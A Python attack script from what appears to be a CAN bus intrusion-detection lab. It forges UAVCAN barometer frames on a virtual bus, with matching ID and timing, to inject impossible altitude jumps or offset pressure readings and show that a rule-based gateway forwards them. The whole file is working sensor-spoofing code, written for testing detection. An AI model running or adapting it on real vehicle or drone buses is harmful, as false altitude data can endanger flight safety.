#!/usr/bin/env python3
"""Node B (Attacker): timing-preserving masquerade - the Tier-1 bypass proof.

The forged frames are structurally identical to the benign barometer node in
01_make_traffic.py: same ID (0x10040405), same 50 Hz cadence, same 8-byte
layout (float32 Pa LE + float16 variance + UAVCAN tail byte). Only the float32
pressure field lies - and when it does, the claimed altitude jumps hundreds of
metres in a single 20 ms step while the RPM sensor (0x18FF1301) stays flat:
physically impossible, but indistinguishable from honest traffic by ID/DLC/rate.

Modes:
  takeover - run next to `01_make_traffic.py --no-baro`: this script IS the baro
             node, at exactly the nominal 20 ms period, with a plausible wobble.
             Every --spike-every frames the claimed altitude jumps by --jump m
             in one frame. Tier 1 forwards every frame (failure log).
  shadow   - run next to the REAL baro node: mirror every genuine frame with a
             +offset Pa shift, keeping its timing/framing; the bus simply sees
             twice the baro rate (still under the flood limit).

Evidence runs (3 terminals):
  T1  python 01_make_traffic.py --no-baro
  T2  python 07_masquerade.py takeover --jump 500
  T3  python gateway_bridge.py --rules-only | tee masquerade_failure.log
  -> [FORWARDED] lines carrying the spike frames are the proof the rule engine
     blindly forwards a physically impossible state. Screenshot that log.
"""
import argparse
import math
import struct
import time

import can

BARO_ID = 0x10040405
SEA_LEVEL_PA = 101325.0
TAIL_BYTE = 0xC0  # start=1 end=1 toggle=0 transfer_id=0 (single-frame transfer)
BARO_PERIOD = 0.02  # nominal 50 Hz - matches the benign node exactly


def alt_to_pa(alt_m: float) -> float:
    return SEA_LEVEL_PA * (1.0 - alt_m / 44330.0) ** 5.255


def frame(pressure_pa: float, variance: int = 4) -> can.Message:
    return can.Message(
        arbitration_id=BARO_ID,
        data=struct.pack("<fH", pressure_pa, variance) + bytes([TAIL_BYTE]),
        is_extended_id=True,
    )


def takeover(args, bus):
    """Sole baro source: honest cadence + wobble, periodic impossible jumps."""
    print(f"[M] takeover: baro node at {1 / BARO_PERIOD:.0f} Hz, "
          f"altitude +{args.jump:.0f} m spike every {args.spike_every} frames")
    t0 = time.time()
    n = spikes = 0
    next_due = time.time()
    try:
        while True:
            t = time.time() - t0
            alt = 2.0 * math.sin(t / 7.0)  # same gentle wobble as the benign node
            if n % args.spike_every == args.spike_every - 1:
                alt += args.jump
                spikes += 1
                print(f"[M][SPIKE #{spikes}] t={t:6.2f}s frame#{n} claims +{args.jump:.0f} m "
                      f"in one 20 ms step ({alt_to_pa(alt):.0f} Pa) - RPM stays flat")
            bus.send(frame(alt_to_pa(alt)))
            n += 1
            next_due += BARO_PERIOD
            time.sleep(max(0.0, next_due - time.time()))
    except KeyboardInterrupt:
        print(f"\n[M] sent {n} frames ({spikes} impossible spikes)")


def shadow(args, bus):
    """Mirror every real baro frame with a pressure offset (rate doubles)."""
    print(f"[M] shadow: mirroring real baro frames with {args.offset:+.0f} Pa "
          f"(~{-args.offset * 0.0084:+.0f} m altitude lie)")
    n = 0
    try:
        while True:
            msg = bus.recv(timeout=1.0)
            if msg is None or msg.arbitration_id != BARO_ID or msg.dlc < 6:
                continue
            p, var = struct.unpack("<fH", bytes(msg.data[:6]))
            bus.send(frame(p + args.offset, var))
            n += 1
    except KeyboardInterrupt:
        print(f"\n[M] mirrored {n} frames")


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("mode", choices=["takeover", "shadow"])
    ap.add_argument("--jump", type=float, default=500.0,
                    help="takeover: claimed altitude jump per spike frame (m)")
    ap.add_argument("--spike-every", type=int, default=50,
                    help="takeover: one spike every N frames (50 = 1 Hz at 50 Hz rate)")
    ap.add_argument("--offset", type=float, default=-1200.0,
                    help="shadow: Pa added to mirrored frames (-1200 Pa ~ +100 m)")
    ap.add_argument("--channel", default="vcan0")
    args = ap.parse_args()

    bus = can.interface.Bus(channel=args.channel, interface="socketcan")
    if args.mode == "takeover":
        takeover(args, bus)
    else:
        shadow(args, bus)


if __name__ == "__main__":
    main()
